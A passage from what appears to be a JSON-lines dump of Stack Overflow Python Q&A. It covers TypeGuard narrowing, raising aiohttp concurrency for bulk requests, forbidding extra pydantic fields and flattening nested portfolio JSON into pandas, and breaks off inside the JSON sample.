MyClass.has_a_num(self):\n            # No more mypy error\n            return self.maybe_num + 3\n        else:\n            return None\n\nclass _MyClass_Int(MyClass):\n    maybe_num: int\n\nTypeGuard was added in Python 3.10, but can be used in earlier versions using the typing_extensions module from pip.\n"
}
{
    "Id": 71232879,
    "PostTypeId": 1,
    "Title": "How to speed up async requests in Python",
    "Body": "I want to download/scrape 50 million log records from a site. Instead of downloading 50 million in one go, I was trying to download it in parts like 10 million at a time using the following code but it's only handling 20,000 at a time (more than that throws an error) so it becomes time-consuming to download that much data. Currently, it takes 3-4 mins to download 20,000 records with the speed of 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 20000/20000 [03:48 so how to speed it up?\nimport asyncio\nimport aiohttp\nimport time\nimport tqdm\nimport nest_asyncio\n\nnest_asyncio.apply()\n\n\nasync def make_numbers(numbers, _numbers):\n    for i in range(numbers, _numbers):\n        yield i\n\n\nn = 0\nq = 10000000\n\n\nasync def fetch():\n    # example\n    url = \"https://httpbin.org/anything/log?id=\"\n\n    async with aiohttp.ClientSession() as session:\n        post_tasks = []\n        # prepare the coroutines that poat\n        async for x in make_numbers(n, q):\n            post_tasks.append(do_get(session, url, x))\n        # now execute them all at once\n\n        responses = [await f for f in tqdm.tqdm(asyncio.as_completed(post_tasks), total=len(post_tasks))]\n\n\nasync def do_get(session, url, x):\n    headers = {\n        'Content-Type': \"application/x-www-form-urlencoded\",\n        'Access-Control-Allow-Origin': \"*\",\n        'Accept-Encoding': \"gzip, deflate\",\n        'Accept-Language': \"en-US\"\n    }\n\n    async with session.get(url + str(x), headers=headers) as response:\n        data = await response.text()\n        print(data)\n\n\ns = time.perf_counter()\ntry:\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(fetch())\nexcept:\n    print(\"error\")\n\nelapsed = time.perf_counter() - s\n# print(f\"{__file__} executed in {elapsed:0.2f} seconds.\")\n\nTraceback (most recent call last):\nFile \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 986, in _wrap_create_connection\n    return await self._loop.create_connection(*args, **kwargs)  # type: ignore[return-value]  # noqa\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\base_events.py\", line 1056, in create_connection\n    raise exceptions[0]\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\base_events.py\", line 1041, in create_connection\n    sock = await self._connect_sock(\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\base_events.py\", line 955, in _connect_sock\n    await self.sock_connect(sock, address)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\proactor_events.py\", line 702, in sock_connect\n    return await self._proactor.connect(sock, address)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\tasks.py\", line 328, in __wakeup\n    future.result()\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\windows_events.py\", line 812, in _poll\n    value = callback(transferred, key, ov)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\windows_events.py\", line 599, in finish_connect\n    ov.getresult()\nOSError: [WinError 121] The semaphore timeout period has expired\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 136, in \n    loop.run_until_complete(fetch())\n  File \"C:\\Users\\SGM\\AppData\\Roaming\\Python\\Python39\\site-packages\\nest_asyncio.py\", line 81, in run_until_complete\n    return f.result()\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\futures.py\", line 201, in result\n    raise self._exception\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\tasks.py\", line 256, in __step\n    result = coro.send(None)\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 88, in fetch\n    response = await f\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 37, in _wait_for_one\n    return f.result()\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\futures.py\", line 201, in result\n    raise self._exception\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\tasks.py\", line 258, in __step\n    result = coro.throw(exc)\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 125, in do_get\n    async with session.get(url + str(x), headers=headers) as response:\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\client.py\", line 1138, in __aenter__\n    self._resp = await self._coro\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\client.py\", line 535, in _request\n    conn = await self._connector.connect(\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 542, in connect\n    proto = await self._create_connection(req, traces, timeout)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 907, in _create_connection\n    _, proto = await self._create_direct_connection(req, traces, timeout)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 1206, in _create_direct_connection\n    raise last_exc\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 1175, in _create_direct_connection\n    transp, proto = await self._wrap_create_connection(\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 992, in _wrap_create_connection\n    raise client_error(req.connection_key, exc) from exc\naiohttp.client_exceptions.ClientConnectorError: Cannot connect to host example.com:80 ssl:default [The semaphore timeout period has expired]\n\n",
    "AcceptedAnswerId": 71285322,
    "AcceptedAnswer": "Bottleneck: number of simultaneous connections\nFirst, the bottleneck is the total number of simultaneous connections in the TCP connector.\nThat default for aiohttp.TCPConnector is limit=100. On most systems (tested on macOS), you should be able to double that by passing a connector with limit=200:\n# async with aiohttp.ClientSession() as session:\nasync with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200)) as session:\n\nThe time taken should decrease significantly. (On macOS: q = 20_000 decreased 43% from 58 seconds to 33 seconds, and q = 10_000 decreased 42% from 31 to 18 seconds.)\nThe limit you can configure depends on the number of file descriptors that your machine can open. (On macOS: You can run ulimit -n to check, and ulimit -n 1024 to increase to 1024 for the current terminal session, and then change to limit=1000. Compared to limit=100, q = 20_000 decreased 76% to 14 seconds, and q = 10_000 decreased 71% to 9 seconds.)\nSupporting 50 million requests: async generators\nNext, the reason why 50 million requests appears to hang is simply because of its sheer number.\nJust creating 10 million coroutines in post_tasks takes 68-98 seconds (varies greatly on my machine), and then the event loop is further burdened with that many tasks, 99.99% of which are blocked by the TCP connection pool.\nWe can defer the creation of coroutines using an async generator:\nasync def make_async_gen(f, n, q):\n    async for x in make_numbers(n, q):\n        yield f(x)\n\nWe need a counterpart to asyncio.as_completed() to handle async_gen and concurrency:\nfrom asyncio import ensure_future, events\nfrom asyncio.queues import Queue\n\ndef as_completed_for_async_gen(fs_async_gen, concurrency):\n    done = Queue()\n    loop = events.get_event_loop()\n    # todo = {ensure_future(f, loop=loop) for f in set(fs)}  # -\n    todo = set()                                             # +\n\n    def _on_completion(f):\n        todo.remove(f)\n        done.put_nowait(f)\n        loop.create_task(_add_next())  # +\n\n    async def _wait_for_one():\n        f = await done.get()\n        return f.result()\n\n    async def _add_next():  # +\n        try:\n            f = await fs_async_gen.__anext__()\n        except StopAsyncIteration:\n            return\n        f = ensure_future(f, loop=loop)\n        f.add_done_callback(_on_completion)\n        todo.add(f)\n\n    # for f in todo:                           # -\n    #     f.add_done_callback(_on_completion)  # -\n    # for _ in range(len(todo)):               # -\n    #     yield _wait_for_one()                # -\n    for _ in range(concurrency):               # +\n        loop.run_until_complete(_add_next())   # +\n    while todo:                                # +\n        yield _wait_for_one()                  # +\n\nThen, we update fetch():\nfrom functools import partial\n\nCONCURRENCY = 200  # +\n\nn = 0\nq = 50_000_000\n\nasync def fetch():\n    # example\n    url = \"https://httpbin.org/anything/log?id=\"\n\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONCURRENCY)) as session:\n        # post_tasks = []                                                # -\n        # # prepare the coroutines that post                             # -\n        # async for x in make_numbers(n, q):                             # -\n        #     post_tasks.append(do_get(session, url, x))                 # -\n        # Prepare the coroutines generator                               # +\n        async_gen = make_async_gen(partial(do_get, session, url), n, q)  # +\n\n        # now execute them all at once                                                                         # -\n        # responses = [await f for f in tqdm.asyncio.tqdm.as_completed(post_tasks, total=len(post_tasks))]     # -\n        # Now execute them with a specified concurrency                                                        # +\n        responses = [await f for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q)]  # +\n\nOther limitations\nWith the above, the program can start processing 50 million requests but:\n\nit will still take 8 hours or so with CONCURRENCY = 1000, based on the estimate from tqdm.\nyour program may run out of memory for responses and crash.\n\nFor point 2, you should probably do:\n# responses = [await f for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q)]\nfor f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q):\n    response = await f\n    \n    # Do something with response, such as writing to a local file\n    # ...\n\n\nAn error in the code\ndo_get() should return data:\nasync def do_get(session, url, x):\n    headers = {\n        'Content-Type': \"application/x-www-form-urlencoded\",\n        'Access-Control-Allow-Origin': \"*\",\n        'Accept-Encoding': \"gzip, deflate\",\n        'Accept-Language': \"en-US\"\n    }\n\n    async with session.get(url + str(x), headers=headers) as response:\n        data = await response.text()\n        # print(data)  # -\n        return data    # +\n\n"
}
{
    "Id": 71837398,
    "PostTypeId": 1,
    "Title": "Pydantic validations for extra fields that not defined in schema",
    "Body": "I am using pydantic for schema validations and I would like to throw an error when any extra field is added to a schema that isn't defined.\nfrom typing import Literal, Union\n\nfrom pydantic import BaseModel, Field, ValidationError\n\n\nclass Cat(BaseModel):\n    pet_type: Literal['cat']\n    meows: int\n\n\nclass Dog(BaseModel):\n    pet_type: Literal['dog']\n    barks: float\n\n\nclass Lizard(BaseModel):\n    pet_type: Literal['reptile', 'lizard']\n    scales: bool\n\n\nclass Model(BaseModel):\n    pet: Union[Cat, Dog, Lizard] = Field(..., discriminator='pet_type')\n    n: int\n\n\nprint(Model(pet={'pet_type': 'dog', 'barks': 3.14, 'eats': 'biscuit'}, n=1))\n\"\"\" try:\n    Model(pet={'pet_type': 'dog'}, n=1)\nexcept ValidationError as e:\n    print(e) \"\"\"\n\n\nIn the above code, I have added the eats field which is not defined. The pydantic validations are applied and the extra values that I defined are removed in response. I wanna throw an error saying eats is not allowed for Dog or something like that. Is there any way to achieve that?\nAnd is there any chance that we can provide the input directly instead of the pet object?\nprint(Model({'pet_type': 'dog', 'barks': 3.14, 'eats': 'biscuit', n=1})). I tried without descriminator but those specific validations are missing related to pet_type. Can someone guide me how to achive either one of that?\n",
    "AcceptedAnswerId": 71838453,
    "AcceptedAnswer": "You can use the extra field in the Config class to forbid extra attributes during model initialisation (by default, additional attributes will be ignored).\nFor example:\nfrom pydantic import BaseModel, Extra\n\nclass Pet(BaseModel):\n    name: str\n\n    class Config:\n        extra = Extra.forbid\n\ndata = {\n    \"name\": \"some name\",\n    \"some_extra_field\": \"some value\",\n}\n\nmy_pet = Pet.parse_obj(data)   # <- effectively the same as Pet(**pet_data)\n\nwill raise a VaidationError:\nValidationError: 1 validation error for Pet\nsome_extra_field\n  extra fields not permitted (type=value_error.extra)\n\nWorks as well when the model is \"nested\", e.g.:\nclass PetModel(BaseModel):\n    my_pet: Pet\n    n: int\n\npet_data = {\n    \"my_pet\": {\"name\": \"Some Name\", \"invalid_field\": \"some value\"},\n    \"n\": 5,\n}\n\npet_model = PetModel.parse_obj(pet_data)\n# Effectively the same as\n# pet_model = PetModel(my_pet={\"name\": \"Some Name\", \"invalid_field\": \"some value\"}, n=5)\n\nwill raise:\nValidationError: 1 validation error for PetModel\nmy_pet -> invalid_field\n  extra fields not permitted (type=value_error.extra)\n\n"
}
{
    "Id": 71104848,
    "PostTypeId": 1,
    "Title": "Mapping complex JSON to Pandas Dataframe",
    "Body": "BackgroundI have a complex nested JSON object, which I am trying to unpack into a pandas df in a very specific way.\nJSON Objectthis is an extract, containing randomized data of the JSON object, which shows examples of the hierarchy (inc. children) for 1x family (i.e. 'Falconer Family'), however there is 100s of them in total and this extract just has 1x family, however the full JSON object has multiple -\n{\n    \"meta\": {\n        \"columns\": [{\n                \"key\": \"value\",\n                \"display_name\": \"Adjusted Value (No Div, USD)\",\n                \"output_type\": \"Number\",\n                \"currency\": \"USD\"\n            },\n            {\n                \"key\": \"time_weighted_return\",\n                \"display_name\": \"Current Quarter TWR (USD)\",\n                \"output_type\": \"Percent\",\n                \"currency\": \"USD\"\n            },\n            {\n                \"key\": \"time_weighted_return_2\",\n                \"display_name\": \"YTD TWR (USD)\",\n                \"output_type\": \"Percent\",\n                \"currency\": \"USD\"\n            },\n            {\n                \"key\": \"_custom_twr_audit_note_911328\",\n                \"display_name\": \"TWR Audit Note\",\n                \"output_type\": \"Word\"\n            }\n        ],\n        \"groupings\": [{\n                \"key\": \"_custom_name_747205\",\n                \"display_name\": \"* Reporting Client Name\"\n            },\n            {\n                \"key\": \"_custom_new_entity_group_453577\",\n                \"display_name\": \"NEW Entity Group\"\n            },\n            {\n                \"key\": \"_custom_level_2_624287\",\n                \"display_name\": \"* Level 2\"\n            },\n            {\n                \"key\": \"legal_entity\",\n                \"display_name\": \"Legal Entity\"\n            }\n        ]\n    },\n    \"data\": {\n        \"type\": \"portfolio_views\",\n        \"attributes\": {\n            \"total\": {\n                \"name\": \"Total\",\n                \"columns\": {\n                    \"time_weighted_return\": -0.046732301295604683,\n                    \"time_weighted_return_2\": -0.046732301295604683,\n                    \"_custom_twr_audit_note_911328\": null,\n                    \"value\": 23132492.905107163\n                },\n                \"children\": [{\n                    \"name\": \"Falconer Family\",\n                    \"grouping\": \"_custom_name_747205\",\n                    \"columns\": {\n                        \"time_weighted_return\": -0.046732301295604683,\n                        \"time_weighted_return_2\": -0.046732301295604683,\n                        \"_custom_twr_audit_note_911328\": null,\n                        \"value\": 23132492.905107163\n                    },\n                    \"children\": [{\n                            \"name\": \"Wealth Bucket A\",\n                            \"grouping\": \"_custom_new_entity_group_453577\",\n                            \"columns\": {\n                                \"time_weighted_return\": -0.045960317420568164,\n                                \"time_weighted_return_2\": -0.045960317420568164,\n                                \"_custom_twr_audit_note_911328\": null,\n                                \"value\": 13264448.506587159\n                            },\n                            \"children\": [{\n                                    \"name\": \"Asset Class A\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": 0.000003434094574039648,\n                                        \"time_weighted_return_2\": 0.000003434094574039648,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 3337.99\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HUDJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": 0.000003434094574039648,\n                                            \"time_weighted_return_2\": 0.000003434094574039648,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 3337.99\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class B\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.025871339096964152,\n                                        \"time_weighted_return_2\": -0.025871339096964152,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 1017004.7192636987\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HUDG Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.025871339096964152,\n                                            \"time_weighted_return_2\": -0.025871339096964152,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 1017004.7192636987\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class C\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.030370376329670656,\n                                        \"time_weighted_return_2\": -0.030370376329670656,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 231142.67772000004\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HKDJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.030370376329670656,\n                                            \"time_weighted_return_2\": -0.030370376329670656,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 231142.67772000004\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class D\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.05382756475465478,\n                                        \"time_weighted_return_2\": -0.05382756475465478,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 9791282.570000006\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HUDW Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.05382756475465478,\n                                            \"time_weighted_return_2\": -0.05382756475465478,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 9791282.570000006\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class E\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.01351630404081805,\n                                        \"time_weighted_return_2\": -0.01351630404081805,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 2153366.6396034593\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HJDJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.01351630404081805,\n                                            \"time_weighted_return_2\": -0.01351630404081805,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 2153366.6396034593\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class F\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.002298190175237247,\n                                        \"time_weighted_return_2\": -0.002298190175237247,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 68313.90999999999\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HADJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.002298190175237247,\n                                            \"time_weighted_return_2\": -0.002298190175237247,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 68313.90999999999\n                                        },\n                                        \"children\": []\n                                    }]\n                                }\n                            ]\n                        },\n                        {\n                            \"name\": \"Wealth Bucket B\",\n                            \"grouping\": \"_custom_new_entity_group_453577\",\n                            \"columns\": {\n                                \"time_weighted_return\": -0.04769870075659244,\n                                \"time_weighted_return_2\": -0.04769870075659244,\n                                \"_custom_twr_audit_note_911328\": null,\n                                \"value\": 9868044.398519998\n                            },\n                            \"children\": [{\n                                    \"name\": \"Asset Class A\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": 0.000028632718065191298,\n                                        \"time_weighted_return_2\": 0.000028632718065191298,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 10234.94\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.0000282679297198829,\n                                                \"time_weighted_return_2\": 0.0000282679297198829,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 244.28\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000049373572795108345,\n                                                \"time_weighted_return_2\": 0.000049373572795108345,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 5081.08\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000006609603754315074,\n                                                \"time_weighted_return_2\": 0.000006609603754315074,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1523.62\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000010999769004760296,\n                                                \"time_weighted_return_2\": 0.000010999769004760296,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1828.9\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000006466673995619843,\n                                                \"time_weighted_return_2\": 0.000006466673995619843,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1557.06\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class B\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.024645947842438676,\n                                        \"time_weighted_return_2\": -0.024645947842438676,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 674052.31962\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.043304004172576405,\n                                                \"time_weighted_return_2\": -0.043304004172576405,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 52800.96\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.022408434778798836,\n                                                \"time_weighted_return_2\": -0.022408434778798836,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 599594.11962\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.039799855483646174,\n                                                \"time_weighted_return_2\": -0.039799855483646174,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 7219.08\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.039799855483646174,\n                                                \"time_weighted_return_2\": -0.039799855483646174,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 7219.08\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.039799855483646174,\n                                                \"time_weighted_return_2\": -0.039799855483646174,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 7219.08\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class C\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.03037038746301135,\n                                        \"time_weighted_return_2\": -0.03037038746301135,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 114472.69744\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.030370390035505124,\n                                                \"time_weighted_return_2\": -0.030370390035505124,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 114472.68744000001\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0,\n                                                \"time_weighted_return_2\": 0,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 0.01\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class D\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.06604362523792162,\n                                        \"time_weighted_return_2\": -0.06604362523792162,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 5722529.229999997\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.06154960593668424,\n                                                \"time_weighted_return_2\": -0.06154960593668424,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1191838.9399999995\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.06750460387418267,\n                                                \"time_weighted_return_2\": -0.06750460387418267,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 4416618.520000002\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.05604507809250081,\n                                                \"time_weighted_return_2\": -0.05604507809250081,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 38190.33\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.05604507809250081,\n                                                \"time_weighted_return_2\": -0.05604507809250081,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 37940.72\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.05604507809250081,\n                                                \"time_weighted_return_2\": -0.05604507809250081,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 37940.72\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class E\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.017118805423322003,\n                                        \"time_weighted_return_2\": -0.017118805423322003,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 3148495.0914600003\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.015251157805867277,\n                                                \"time_weighted_return_2\": -0.015251157805867277,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 800493.06146\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.01739609576880241,\n                                                \"time_weighted_return_2\": -0.01739609576880241,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 2215511.2700000005\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.02085132265594647,\n                                                \"time_weighted_return_2\": -0.02085132265594647,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44031.21\n                                            },\n                                    